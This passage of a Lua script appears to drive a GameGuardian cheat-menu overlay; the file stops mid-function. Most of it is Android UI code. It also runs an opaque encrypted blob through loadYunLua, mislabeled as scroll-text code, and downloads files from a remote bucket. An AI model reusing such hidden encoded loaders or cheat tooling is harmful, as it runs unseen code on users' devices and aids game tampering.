local json = json

function huiz()--有绘制写这里面
draw.setStyle('填充')
draw.setColor("#00ffff")
draw.setSize(40)
draw.text('息白内部[特别版]', 100,300)
draw.text(os.date'登录时间:%m月%d日%H时%M分%S秒', 100,350)
draw.text('[TG:@XJBAI667]', 100,400)
end
stitle = "息白内部特别版\n代理.：诗雨·单简"--滚动字体

loadYunLua("httpByQn0RTmbpsGdcPcXyFHiZ+j9yFx3DxxS8h4F7365IpTfJLgFcN4Pn8VMvFUVetSIWZ80xpcl3YXfFTIJPD6hV7JDYVkQJ9u94A3s9j1SUdjnamufdFe/ZBisObVZTPLRouY6R0EVF4fmhAxYWUIv9TYKibwyLKJoR7XOs78bXYeAZhrp3WMwKkIblf0cYbIGldoJUu1NIcHUhTHDlNpInhEo+4HUwKfWQi3NQvKZ5VTLsvM0PrgbabAo7utlAIlrOrKcVGgrSvci7izDMLGsmETGFFiM8vfcIAozy0aJEEEpvWGg/JonZuLt7EXpZEdVali1jlXIxijckqOr63V30QQaGDEU09YD+x/VVRpSAZhXBa6q0Rw83g7Wces")-------滚动字体代码别动
string.toMusic('欢迎使用息白内部特别版，已适配3.0版本')
vibra = context:getSystemService(Context.VIBRATOR_SERVICE)


----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
changan = {}
local changan = changan
local android = import('android.*')
function write(fileName, content)
--f = assert( io.open( fileName, 'w'))   f:write( content )     f:close()
if file.write(fileName, content) == false then gg.alert("请给框架和修改器 文件储存权限\n否则无法正常运行") os.exit() end
end
function panduan(rec) fille,err = io.open(rec) if fille == nil then return false else return true end end
function pdcf(lujing) rec = "/sdcard/息/配置文件/"..lujing fille,err = io.open(rec) if fille == nil then return false else return true end end
sleep = gg.sleep
--if gg.isHTTPdump()==true and panduan("/sdcard/息/配置文件/vpn.txt") == false then gg.alert("\n抓包？") os.exit() end
function read(fileName) f = assert(io.open(fileName, 'r')) content = f:read("*all") f:close() return content end
function wtcf(lujing,neirong)
write("/sdcard/息/配置文件/"..lujing,neirong)
end
function rdcf(lujing)
return read("/sdcard/息/配置文件/"..lujing)
end
function pmusic(x) if audiokg == "开" then tmp1 = 0 gg.playMusic(x) tmp1 = 1 end end
if pdcf("audio") ~= true then wtcf("audio","开") end
audiokg = rdcf("audio")
function camusic(ress)
tmp1 = 0
if audiokg == "开" then
if panduan("/sdcard/息/音频/"..ress) == true then
pmusic("/sdcard/息/音频/"..ress)
tmp1 = 1
else
	file.download("https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/"..ress ,"/sdcard/息/音频/"..ress)
pmusic("/sdcard/息/音频/"..ress)
tmp1 = 1
end
end
end
开 = "开" 关 = "关"
function checkimg(tmp)
if panduan("/sdcard/息/图片/"..tmp) ~= true then
gg.toast("正在下载资源"..tmp.."\n请耐心等待")
file.download("https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/"..tmp,"/sdcard/息/图片/"..tmp)
end
end
file.getdirs("/sdcard/息/状态读取/")
ckimg = {
	"check1",
	"check2",
	"exit",
}
for i = 1,#ckimg do
jindu = i
checkimg(ckimg[i])
end
context = app.context
window = context:getSystemService("window") -- 获取窗口管理器
function getLayoutParams()
LayoutParams = WindowManager.LayoutParams
layoutParams = luajava.new(LayoutParams)
if (Build.VERSION.SDK_INT >= 26) then -- 设置悬浮窗方式
layoutParams.type = LayoutParams.TYPE_APPLICATION_OVERLAY
else
	layoutParams.type = LayoutParams.TYPE_PHONE
end

layoutParams.format = PixelFormat.RGBA_8888 -- 设置背景
layoutParams.flags = LayoutParams.FLAG_NOT_FOCUSABLE -- 焦点设置Finish
layoutParams.gravity = Gravity.TOP|Gravity.LEFT -- 重力设置
layoutParams.width = LayoutParams.WRAP_CONTENT -- 布局宽度
layoutParams.height = LayoutParams.WRAP_CONTENT -- 布局高度







return layoutParams
end
function getj6()
jianbian6 = luajava.new(GradientDrawable)
jianbian6:setCornerRadius(20)
jianbian6:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbian6:setColors({
	0x11000000,0x11000000
})
jianbian6:setStroke(1,"0xeedddddd")--边框宽度和颜色
return jianbian6
end
slctb2 = luajava.loadlayout({
	GradientDrawable,
	color = "#7f7fd5",
	cornerRadius = 10
})
function getseekgra()
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(10)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0x6600c6ff,0x660072ff})
jianbians:setStroke(4,"0xeeffffff")--边框宽度和颜色
return jianbians
end
function getseekgra2()
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(8)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0xeeffffff,0xccffffff})
jianbians:setStroke(1,"0xee000000")--边框宽度和颜色
return jianbians
end
dbgra = luajava.new(GradientDrawable)
dbgra:setCornerRadius(90)
dbgra:setGradientType(GradientDrawable.LINEAR_GRADIENT)
dbgra:setColors({0xaaffffff,0xaaffffff})
dbgra:setOrientation(GradientDrawable.Orientation.LEFT_RIGHT)
dbgra:setStroke(8,"0xee000000")--边框宽度和颜色

slctb = dbgra
dbgra = luajava.new(GradientDrawable)
dbgra:setCornerRadius(90)
dbgra:setGradientType(GradientDrawable.LINEAR_GRADIENT)
dbgra:setColors({0x66888888,0x66888888})
dbgra:setOrientation(GradientDrawable.Orientation.LEFT_RIGHT)
dbgra:setStroke(8,"0xee000000")--边框宽度和颜色

slcta = dbgra
slctc = luajava.loadlayout {
	GradientDrawable,
	color = "#11ffffff",
	cornerRadius = 8
}
slctd = luajava.loadlayout {
	GradientDrawable,
	color = "#55ffffff",
	cornerRadius = 8
}
slcte = luajava.loadlayout {
	GradientDrawable,
	color = "#11ffffff",
	cornerRadius = 12
}
slctf = luajava.loadlayout {
	GradientDrawable,
	color = "#aa1E1C27",
	cornerRadius = 15
}
function getjb()
local jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(15)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0xff397EF8,0xff25C4FD})
jianbians:setOrientation(GradientDrawable.Orientation.LEFT_RIGHT)
return jianbians
end
function chatbg2()
selector = luajava.getStateListDrawable()
selector:addState({
	android.R.attr.state_pressed
}, luajava.loadlayout {
	GradientDrawable,
	color = "#aa0082FF",
	cornerRadius = 12
}) -- 点击时候的背景
selector:addState({
	-android.R.attr.state_pressed
}, getjb()) -- 没点击的背景
return selector
end
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(10)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0xaaFF70C7,0x66FF99E1})
jianbians:setStroke(4,"0xeeFFffff")--边框宽度和颜色
t9s=jianbians

jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(10)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0xaaFF6EBF,0x660072ff})
jianbians:setStroke(4,"0xeeFFffff")--边框宽度和颜色
t3s=jianbians
t4s=luajava.loadlayout {
	GradientDrawable,
	color = "#87000000",
	cornerRadius = 12
}
t5s=jianbians
t6s=luajava.loadlayout {
	GradientDrawable,
	color = "#87000000",
	cornerRadius = 12
}
function getSelector3()
selector = luajava.getStateListDrawable()
selector:addState({
	android.R.attr.state_pressed
}, t4s) -- 点击时候的背景
selector:addState({
	-android.R.attr.state_pressed
}, t9s) -- 没点击的背景
return selector
end
function getSelector5()
selector = luajava.getStateListDrawable()
selector:addState({
	android.R.attr.state_pressed
}, t6s) -- 点击时候的背景
selector:addState({
	-android.R.attr.state_pressed
}, t5s) -- 没点击的背景
return selector
end
function getSelector()
selector = luajava.getStateListDrawable()
selector:addState({
	android.R.attr.state_pressed
}, slcta) -- 点击时候的背景
selector:addState({
	-android.R.attr.state_pressed
}, slctb) -- 没点击的背景
return selector
end
function getSelector2()
selector = luajava.getStateListDrawable()
selector:addState({
	android.R.attr.state_pressed
}, slctd) -- 点击时候的背景
selector:addState({
	-android.R.attr.state_pressed
}, slctc) -- 没点击的背景
return selector
end

jianbian = luajava.new(GradientDrawable)
jianbian:setCornerRadius(30)
jianbian:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbian2 = luajava.new(GradientDrawable)
jianbian2:setCornerRadius(30)
jianbian2:setGradientType(GradientDrawable.LINEAR_GRADIENT)

local isswitch
YoYoImpl = luajava.getYoYoImpl()
changan.menu = function(sview)
if isswitch then
return false
end
for i=1,#stab do
	_ENV["jmb"..i]=getSelector()
end
if #stab> #sview then gg.alert("菜单标题参数多于菜单配置，请检查") os.exit() end
isswitch = true
cebian = {
	LinearLayout,
	id = "侧边",
	visibility = "gone",
	layout_height = "230dp",
	layout_width = "88dp",
	orientation = "vertical",
	background = {
		GradientDrawable,
		color = "#00ffffff",
		cornerRadius = 10
	},
}
gund = {
	LinearLayout,
	orientation = "vertical",
}
for i = 1,#stab do
_ENV["jm"..i]=luajava.loadlayout({
	LinearLayout,
	id = "jm"..i,
	layout_height = "38dp",
	layout_width = "88dp",
	layout_marginTop = "2dp",
	layout_marginBottom = "2dp",
	background = _ENV["jmb"..i],
	onClick=function() 
	--changan.controlFlip(_ENV["jm"..i],500)
	切换(i) end,
	{
		TextView,
		gravity = "center",
		textColor="#000000",
		text = stab[i][1],
		layout_height = "38dp",
		layout_width = "88dp",
		--onClick = function() 切换(i) end
	}})
gund[#gund+1] = _ENV["jm"..i]
end
cebian[#cebian+1] = {
	ScrollView,
	layout_height = "fill_parent",
	layout_width = "fill_parent",
	gund
}
cebian = luajava.loadlayout(cebian)
for i = 1,#stab do
_ENV["layout"..i] = luajava.loadlayout(
	{
		ScrollView,
		background = getj6(),
		fillViewport = "true",
		padding = "3dp",
		id = "layout"..i,
		visibility = "gone",
		layout_width = "230dp",
		layout_height = "230dp",
		orientation = "vertical",
			{
			LinearLayout,
			--background = getj6(),
			id = "layoutm"..i,
			gravity = "top",
			layout_width = "230dp",
			orientation = "vertical",
			gravity = "center_horizontal",
		},
	
	})
end
_ENV["layout".. 4] = luajava.loadlayout(
	{LinearLayout,
			orientation = "horizontal",
			layout_width="wrap_content",
			layout_height="230dp",
			visibility = "gone",
		{
		ScrollView,
		background = getj6(),
		fillViewport = "true",
		padding = "3dp",
		id = "layouts".. 4,
		layout_width = "230dp",
		layout_height = "230dp",
		orientation = "vertical",
			{
			LinearLayout,
			--background = getj6(),
			id = "layoutm"..4,
			gravity = "top",
			layout_width = "230dp",
			orientation = "vertical",
			gravity = "center_horizontal",
		}},
	{ScrollView,
		fillViewport = "true",
		{LinearLayout,
			id="layoutg4",
			orientation="vertical",
			gravity="center",
			layout_width="230dp",
			layout_height="wrap_content",
		}}
	})
ckou = {
	LinearLayout,
	id = "chuangk",
	padding="4dp",
	visibility = "gone",
	layout_width = "wrap_content",
	layout_height = "wrap_content",
	orientation = "horizontal",
	cebian,
	
}
for i = 1,#stab do
ckou[#ckou+1] = _ENV["layout"..i]
end
--luajava.newThread(function() develo(ckou) end):start()
ckou = luajava.loadlayout(ckou)
title = luajava.loadlayout({
	TextView,
	id = "title",
	textColor = "#ffffff",
	visibility = "gone",
	text = stab[1][2],
	gravity = "center",
	textSize = "23sp",
	layout_width = "fill_parent",
})
control1=luajava.loadlayout({
			ImageView,
			id = "control",
			--layout_gravity = "left",
			background = xfcpic,
			layout_width = "40dp",
			layout_height = "40dp",
		})
frme=luajava.loadlayout({
		FrameLayout,
		padding = "10dp",
		layout_width = "match_parent",
		layout_height = "wrap_content",
		orientation = "horizontal",
		background = beij2,
		gravity = "center",
		control1,
		title,
		{
			ImageView,
			id = "exitt",
			visibility = "gone",
			layout_gravity = "right",
			src = "https://cccimg.com/down.php/7614d50dd7d848b8f9c5edb0953799d8.pug",
			layout_width = "30dp",
			layout_height = "30dp",
			layout_marginTop = "12dp",
			layout_marginRight = "14dp",
		}
	})

floatWindow = 
{FrameLayout,
	id = "motion",
	layout_width = "wrap_content",
	orientation = "vertical",
	gravity = "center_vertical",
	layout_height = "wrap_content",

	{
	LinearLayout,
	layout_width = "wrap_content",
	orientation = "vertical",
	gravity = "center_vertical",
	layout_height = "wrap_content",
	frme,
	ckou
}}
local function invoke()
local ok
local RawX, RawY, x, y
mainLayoutParams = getLayoutParams()
floatWindow = luajava.loadlayout(floatWindow)
local function invoke2()
block('start')
for k = 1,#stab do
for i = 1,#sview[k] do
_ENV["layoutm"..k]:addView(sview[k][i])
end
end

window:addView(floatWindow, mainLayoutParams)
block('end')
end

local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
block('join')
control.onClick = function()
隐藏()
end
exitt.onClick = function()
隐藏()
end
jm4.onClick = function()
--changan.controlFlip(jm4,500)
切换(4)
gundong()
already = true
changan.setedit("用户名",qltname)
changan.setedit("请输入链接或QQ",qlticon)
end
local isMove

hanshu = function(v, event)
local Action = event:getAction()
if Action == MotionEvent.ACTION_DOWN then
isMove = false
RawX = event:getRawX()
RawY = event:getRawY()
x = mainLayoutParams.x
y = mainLayoutParams.y
elseif Action == MotionEvent.ACTION_MOVE then
isMove = true
mainLayoutParams.x = tonumber(x) + (event:getRawX() - RawX)
mainLayoutParams.y = tonumber(y) + (event:getRawY() - RawY)
window:updateViewLayout(floatWindow, mainLayoutParams)
end
end
motion.onTouch = hanshu
control.onTouch = hanshu
exitt.onTouch = hanshu
for i = 1,#stab do
--_ENV["jm"..i].onTouch = hanshu
end
end

invoke(swib1,swib2)
jm1:setBackground(slcta)
gg.setVisible(false)
luajava.setFloatingWindowHide(true)

end
corbk = true
当前ui = 1
function 切换(x)
当前ui = x
luajava.runUiThread(function()
	for i = 1,#stab do
	_ENV["jm"..i]:setBackground(_ENV["jmb"..i])
	_ENV["layout"..i]:setVisibility(View.GONE)
	end
	title:setText(stab[当前ui][2])
	_ENV["layout"..当前ui]:setVisibility(View.VISIBLE)
	_ENV["jm"..当前ui]:setBackground(slcta)
	YoYoImpl:with("FadeIn"):duration(200):playOn(_ENV["layout"..当前ui])
	end)
end
显示 = 0
beij = luajava.new(GradientDrawable)
beij:setCornerRadius(20)
beij:setGradientType(GradientDrawable.LINEAR_GRADIENT)
beij:setColors(({0x44FF74C6,0x44598AFF}))
beij:setStroke(0,"0xff598AFF")--边框宽度和颜色

beij2 = luajava.loadlayout({
	GradientDrawable,
	color = "#001E1C27",
	cornerRadius = 10
})


titlejb = luajava.new(GradientDrawable)
titlejb:setCornerRadius(20)
titlejb:setGradientType(GradientDrawable.LINEAR_GRADIENT)
titlejb:setColors(({0x99FF74C6,0xee598AFF}))
titlejb:setStroke(0,"0xee000000")--边框宽度和颜色

function getcolor(cl)
cl[1] = tonumber(math.ceil(cl[1]*2.6,0,5))

if cl[1] > 255 then cl[1] = "0xff" else
	cl[1] = "0x"..string.format("%x",cl[1]) end
for i = 1,3 do
cl[i+1] = string.format("%x",cl[i+1])
if string.len(cl[i+1]) == 1 then cl[i+1] = "0"..cl[i+1] end
end
cl = cl[1]..cl[2]..cl[3]..cl[4]
return cl
end
function getrgb(cl)
if string.sub(cl,1,1) == "#" then cl = "0x"..string.sub(cl,2,-1) end
cl = {
	tonumber(string.sub(cl,0,4)),tonumber("0x"..string.sub(cl,5,6)),tonumber("0x"..string.sub(cl,7,8))}
return cl
end
function 隐藏()
luajava.runUiThread(function()
--control:setBackground(luajava.getBitmapDrawable("/sdcard/息/图片/arlogo"))
	if tonumber(tostring(cebian:getVisibility())) == 8.0 then
	chuangk:setVisibility(View.VISIBLE)
	cebian:setVisibility(View.VISIBLE)
	title:setVisibility(View.VISIBLE)
	exitt:setVisibility(View.VISIBLE)
	frme:setBackground(titlejb)
	显示=1 zdbf2=true
	mainLayoutParams.flags = LayoutParams.FLAG_NOT_TOUCH_MODAL
	window:updateViewLayout(floatWindow, mainLayoutParams)
	YoYoImpl:with("SlideInDown"):duration(200):playOn(cebian)
	_ENV["layout"..当前ui]:setVisibility(View.VISIBLE)
	YoYoImpl:with("FadeIn"):duration(800):playOn(_ENV["layout"..当前ui])
	floatWindow:setBackground(beij)
	else
		显示=0 zdbf2=false
		luajava.runUiThread(function()mainLayoutParams.flags = LayoutParams.FLAG_NOT_FOCUSABLE
		window:updateViewLayout(floatWindow, mainLayoutParams)
		end)
	frme:setBackground(beij2)
--control:setBackground(luajava.getBitmapDrawable("/sdcard/息/图片/arlogo"))
	title:setVisibility(View.GONE)
	exitt:setVisibility(View.GONE)
	floatWindow:setBackground(beij2)
	chuangk:setVisibility(View.GONE)
	cebian:setVisibility(View.GONE)
	_ENV["layout"..当前ui]:setVisibility(View.GONE)
	end
	end)
end
function guid()
seed = {
	'e','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'
}
tb = {}
for i = 1,32 do
table.insert(tb,seed[math.random(1,16)])
end
sid = table.concat(tb)
return string.format('%s%s%s%s%s',
	string.sub(sid,1,8),
	string.sub(sid,10,12),
	string.sub(sid,21,22))
..string.format('%s%s%s%s%s',
	string.sub(sid,1,6),
	string.sub(sid,21,25)
)
end
local function exit()---中间
tuichu = 1
luajava.setFloatingWindowHide(false)

luajava.post(function()
	window:removeView(floatWindow)
	end)
end


setExitEvent(exit)
changan.controlWater = function(control,time)
luajava.runUiThread(function()
	import "android.animation.ObjectAnimator"
	ObjectAnimator():ofFloat(control,"scaleX", {
		1, 0.8, 0.9, 1
	}):setDuration(time):start()
	ObjectAnimator():ofFloat(control,"scaleY", {
		1,0.8,0.9,1
	}):setDuration(time):start()
end) end
import("android.media.AudioManager")
audi = context:getSystemService("audio")
audiotype = {
	AudioManager.STREAM_ALARM, --手机闹铃的声音
	AudioManager.STREAM_MUSIC, --手机音乐的声音
	AudioManager.STREAM_NOTIFICATION, --系统提示的通知
	AudioManager.STREAM_RING, --电话铃声的声音
	AudioManager.STREAM_SYSTEM, --手机系统的声音
	AudioManager.STREAM_VOICE_CALL, --语音电话的声音
	AudioManager.STREAM_DTMF, --DTMF音调的声音
}
yinl = {}
for i = 1,#audiotype do
yinl[i] = {}
yinl[i].type = audiotype[i]
yinl[i].min = audi:getStreamMinVolume(audiotype[i])
yinl[i].max = audi:getStreamMaxVolume(audiotype[i])
yinl[i].now = audi:getStreamVolume(audiotype[i])
end
yltype = 0
function jianting3(func)
yinln = {}
for i = 1,#audiotype do
yinln[i] = {}
yinln[i].type = audiotype[i]
yinln[i].now = audi:getStreamVolume(audiotype[i])
if yinln[i].now > yinl[i].now then
yinl[i].now = yinln[i].now
if yltype == 1 then
yltype = 0
func()
end
elseif yinln[i].now < yinl[i].now then
yinl[i].now = yinln[i].now
if yltype == 0 then
yltype = 1
func()
end
end
end
end
qhkai = 0
qiehuan = function()
if qhkai == 0 then
qhkai = 1
draw.remove()
gg.toast("已隐藏")
luajava.runUiThread(function()
	changan.controlSmall(floatWindow,400)
	end)
gg.sleep(400)
luajava.runUiThread(function()
	floatWindow:setVisibility(View.GONE)
	end)
else
	qhkai = 0
huiz()
--draw.text('.', -9200,-9200)
luajava.runUiThread(function() floatWindow:setVisibility(View.VISIBLE) end)
luajava.runUiThread(function()
	changan.controlBig(floatWindow,400)
	end)

end
end
changan.controlSmall = function(control,time)
luajava.runUiThread(function()
	import "android.animation.ObjectAnimator"
	ObjectAnimator():ofFloat(control,"scaleX", {
		1, 0.7, 0.4, 0
	}):setDuration(time):start()
	ObjectAnimator():ofFloat(control,"scaleY", {
		1, 0.7, 0.4, 0
	}):setDuration(time):start()
	end) end
changan.controlBig = function(control,time)
luajava.runUiThread(function()
	import "android.animation.ObjectAnimator"
	ObjectAnimator():ofFloat(control,"scaleX", {
		0, 0.4, 0.7, 1
	}):setDuration(time):start()
	ObjectAnimator():ofFloat(control,"scaleY", {
		0, 0.4, 0.7, 1
	}):setDuration(time):start()
	end) end


chazhi = {} chajv = {}
function changan.seek(name,bian,smin,smax,nows)
_ENV[bian] = nows
thum=getseekgra()
thum:setSize(60, 60)
smin = tonumber(smin) smax = tonumber(smax)
chajv[bian] = smax-smin
chazhi[bian] = 1-smin
if smin == nil then smin = 1 smax = 10 end
truesmin = 1
truesmax = truesmin+chajv[bian]
if not nows then nows = smin tnows = (smin-nows)
else
	tnows = (nows-smin)+1
end
if _ENV[bian] == nil then _ENV[bian] = 1.0 end
if not name then name = "未设置" end
local names = name..guid()
rest = luajava.loadlayout({
	LinearLayout,
	layout_width = 'fill_parent',
	layout_hight = "fill_parent",
	{
		LinearLayout,
		layout_width = 'fill_parent',
		layout_hight = "fill_parent",
		layout_marginTop = "5dp",
		layout_marginBottom = "5dp",
		layout_marginLeft = "10dp",
		layout_marginRight = "10dp",
		gravity = "center_vertical",
		background = getseekgra(),
		{
			TextView,
			gravity = "top",
			textColor=txtco,
			text = name..":"..nows,
			id = luajava.newId(names),
			layout_width = '70dp',
			layout_marginLeft = "5dp",
			layout_marginRight = "0dp",
		},
		{
			SeekBar,
			layout_width = '120dp',
			min = truesmin,
			max = truesmax,
			progress = tnows,
			progressDrawable={getseekgra2()},
			thumb=thum,
			onSeekBarChange = {
onProgressChanged = function(SeekBar, var2, var3)
if not var3 then
return
end
local resultvar = tonumber(string.sub(var2,0,-3))-chazhi[bian]
luajava.runUiThread(function()
	luajava.getIdValue(names):setText(name..":".. resultvar)
	end)
_ENV[bian] = resultvar
end
			}}
	}})

return rest
end





function changan.switch(name,func1,func2)
local func = 开关(name,func1,func2)
if not name then name = "未设置" end
rest = luajava.loadlayout({
	LinearLayout,
	layout_width = 'fill_parent',
	layout_hight = "fill_parent",
	{
		LinearLayout,
		layout_width = 'fill_parent',
		layout_hight = "fill_parent",
		layout_marginTop = "5dp",
		layout_marginBottom = "5dp",
		layout_marginLeft = "10dp",
		layout_marginRight = "10dp",
		gravity = "center_vertical",
		background = getseekgra(),
		{
			TextView,
			gravity = "top",
			text = name,
			layout_width = '140dp',
			layout_marginLeft = "10dp",
			layout_marginRight = "10dp",
		},
		{
			Switch,
			gravity = "top",
			layout_width = 'match_parent',
			layout_hight = "10dp",
--id=luajava.newId(tid),
			switchMinWidth = "20dp",
			onCheckedChange = function(Switch,var2,var3)
			if var2 == true then var2 = "开" else var2 = "关" end
			luajava.newThread(function() func() end):start()
			end,

		}}
})

return rest
end
function changan.edit(name)
_ENV[name] = name..guid()
if not name then name = "点击输入文字" end
rest = luajava.loadlayout({
	LinearLayout,
	layout_width = 'fill_parent',
	layout_hight = "fill_parent",
	{
		LinearLayout,
		layout_width = 'fill_parent',
		layout_hight = "fill_parent",
		layout_marginTop = "5dp",
		layout_marginBottom = "5dp",
		layout_marginLeft = "10dp",
		layout_marginRight = "10dp",
		gravity = "center_vertical",
		background = getseekgra(),
		{
			EditText,
			gravity = "top",
			hint = name,
			gravity = "center",
			id = luajava.newId(_ENV[name]),
			layout_width = 'fill',
			layout_marginLeft = "10dp",
			layout_marginRight = "10dp",
		}}
})

return rest
end
function changan.radio(radio)
firadio = {
	LinearLayout,
	layout_width = 'fill_parent',
	layout_hight = "fill_parent",
	padding = "10dp",
	orientation = "vertical"
}
if type(radio[1]) == "string" or type(radio[1]) == "number" then
firadio[#firadio+1] = {
	TextView,text = radio[1],
	textColor=txtco
} end
radios = {
	RadioGroup,background = getseekgra(),
	layout_width = 'fill_parent',
}
for i = 2,#radio do
radios[#radios+1] = {
	RadioButton,
	layout_width = 'fill_parent',
	text = radio[i][1],
	textColor=txtco,
	onClick = function() luajava.newThread(function() pcall(radio[i][2]) end):start() end,
}
end
firadio[#firadio+1] = radios
return luajava.loadlayout(firadio)
end

function changan.check(cklist)
local rest = {
	GridLayout,
	columnCount = '3',
	layout_width = 'match_parent',
	layout_height = "wrap_content",
	layout_marginLeft = "3dp",
	layout_marginRight = "3dp",
	gravity = "center"

}
for i = 1,#cklist do
local name = cklist[i][1]
local func1 = cklist[i][2]
local func2 = cklist[i][3]
if not name then name = "未设置" end
rstt = changan.intcheck(name,func1,func2)
rest[#rest+1] = rstt
end
return luajava.loadlayout({
	LinearLayout,rest
})
end
function changan.intcheck(name,func1,func2)
nid = name..guid()
local func = 开关3(name,func1,func2,nid)
if not name then name = "未设置" end
local rest = luajava.loadlayout({
	LinearLayout,
	layout_width = 'wrap_content',
	layout_height = "40dp",
	layout_marginTop = "1dp",
	layout_marginBottom = "1dp",
	padding = "1dp",
	{
		LinearLayout,
		onClick = function() luajava.newThread(function() func() end):start() end,
		layout_width = 'fill_parent',
		layout_height = "32dp",
		gravity = "center_vertical",
		
		{
			TextView,
			gravity = "left",
			text = name,
			--textColor="#00A4FF",
			textSize = "12sp",
			gravity="center",
--layout_marginLeft="8dp",
			layout_width = '45dp',
		},
		{
            FrameLayout,
            id = luajava.newId(nid),
            background = checkbg,
            onClick = function() luajava.newThread(function() func() end):start() end,
            layout_width = '38dp',
            layout_height = 'wrap_content',
            padding="1dp",
            {
            LinearLayout,
            layout_gravity="left",
            id = luajava.newId(nid.."k"),
            background = checkbg1,
            onClick = function() luajava.newThread(function() func() end):start() end,
            layout_width = '19dp',
            layout_height = '19dp',
        	},{
            LinearLayout,
            visibility="gone",
            layout_gravity="right",
            id = luajava.newId(nid.."g"),
            background = checkbg2,
            onClick = function() luajava.newThread(function() func() end):start() end,
            layout_width = '19dp',
            layout_height = '19dp',
        	}
        }}
})

return rest
end
function 开关3(name,func1,func2,nid)
name=name..guid()
_ENV[name] = "关"
if func1 == nil then func1 = "" end
if func2 == nil then func2 = "" end
if type(func1) == "function" then
return function()
namers = _ENV[name]
if namers ~= "开" then
luajava.runUiThread(function()
    luajava.getIdValue(nid.."k"):setVisibility(View.GONE)
    luajava.getIdValue(nid.."g"):setVisibility(View.VISIBLE)
    luajava.getIdValue(nid):setBackground(checkbga)
    end)
_ENV[name] = "开"
vibra:vibrate(10)
pcall(func1)
else
	luajava.runUiThread(function()
	luajava.getIdValue(nid.."g"):setVisibility(View.GONE)
    luajava.getIdValue(nid.."k"):setVisibility(View.VISIBLE)
    luajava.getIdValue(nid):setBackground(checkbg)
    end)
_ENV[name] = "关"
vibra:vibrate(10)

pcall(func2)
end
end
end
end

function getShape(tmp0,tmp1,tmp2,tmp3)
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(tmp0)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors(tmp1)
jianbians:setOrientation(GradientDrawable.Orientation.LEFT_RIGHT)
jianbians:setStroke(0,tmp3)--边框宽度和颜色
return jianbians
end
function getShape2(tmp0,tmp1,tmp2,tmp3)
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(tmp0)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors(tmp1)
jianbians:setOrientation(GradientDrawable.Orientation.LEFT_RIGHT)
jianbians:setStroke(0,tmp3)--边框宽度和颜色
return jianbians
end
checkbg=getShape(
	45,
	{0xffB8B8B8,0xffB8B8B8},
	4,0xaa000000)
checkbga=getShape(
	45,
	{0xff0BBE56,0xff0BBE56},
	4,0xaa000000)
checkbg1=getShape2(
	45,
	{0xffffffff,0xffffffff},
	4,0xaa000000)
checkbg2=getShape2(
	45,
	{0xffffffff,0xffffffff},
	4,0xaa000000)
function changan.button(txt,func)
if not txt then txt = "未设置" end
return luajava.loadlayout(
	{
		LinearLayout,
		layout_width = 'fill_parent',
		layout_hight = "wrap_content", {
			LinearLayout,
			layout_width = "fill_parent",
			gravity = "center_horizontal",
			layout_marginRight = "10dp",
			layout_marginLeft = "10dp",
			layout_marginTop = "5dp",
			layout_marginBottom = "5dp",
			background = getSelector5(),
			onClick = function() luajava.newThread(function() pcall(func) end):start() end,
			{
TextView,
--id = luajava.newId(tid),
text = txt,
textColor=txtco,
textSize = "16sp",
layout_width = "wrap_content",
			},
		}})
end
function changan.text(txt,color,size)
if not txt then txt = "未设置文字" end
if not color then color = "#ffffff" end
if not size then size = "18sp" end
return luajava.loadlayout(
	{
		TextView,
		text = txt,
		textSize = size,
		textColor = color,
		layout_width = "wrap_content",
	})
end
corb = true
function changan.setedit(name,txt)
txt = tostring(txt)
luajava.runUiThread(function()
	luajava.getIdValue(_ENV[name]):setText(txt)
	end)
end

function changan.getedit(name)
--gg.alert(edit)
edit = tostring(luajava.getIdValue(_ENV[name]):getText())
return edit
end
function 开关(name,func1,func2)
if func1 == nil then func1 = "" end
if func2 == nil then func2 = "" end
if type(func1) == "function" then
return function()
namers = _ENV[name]
if namers ~= "开" then
_ENV[name] = "开"
pcall(func1)
else
	_ENV[name] = "关"
pcall(func2)
end

end
end
end
function 开关2(name,func1,func2,nid)
if func1 == nil then func1 = "" end
if func2 == nil then func2 = "" end
if type(func1) == "function" then
return function()
namers = _ENV[name]
if namers ~= "开" then
luajava.runUiThread(function()
	luajava.getIdValue(nid):setBackground(luajava.getBitmapDrawable("/sdcard/息/图片/check2"))
	end)
_ENV[name] = "开"
func1()
else
	luajava.runUiThread(function()
	luajava.getIdValue(nid):setBackground(luajava.getBitmapDrawable("/sdcard/息/图片/check1"))
	end)
_ENV[name] = "关"
func2()
end

end
end
end
function deve(t)
luajava.newThread(function() gg.alert(tostring(t)) end):start()
end
changan.controlChange = function(control,colors)
luajava.runUiThread(function()
	if type(colors) ~= "table" then
	end
	import "android.animation.ObjectAnimator"
	import "android.animation.ArgbEvaluator"
	import "android.animation.ValueAnimator"
	import "android.graphics.Color"
	colorAnim = ObjectAnimator:ofInt(control,"textColor", colors)
	colorAnim:setDuration(7000)
	colorAnim:setEvaluator(ArgbEvaluator())
	colorAnim:setRepeatCount(ValueAnimator.INFINITE)
	colorAnim:setRepeatMode(ValueAnimator.REVERSE)
	colorAnim:start()
	end)
end
changan.controlRotetion = function(control,time)
luajava.runUiThread(function()
	import "android.view.animation.Animation"
	import "android.animation.ObjectAnimator"
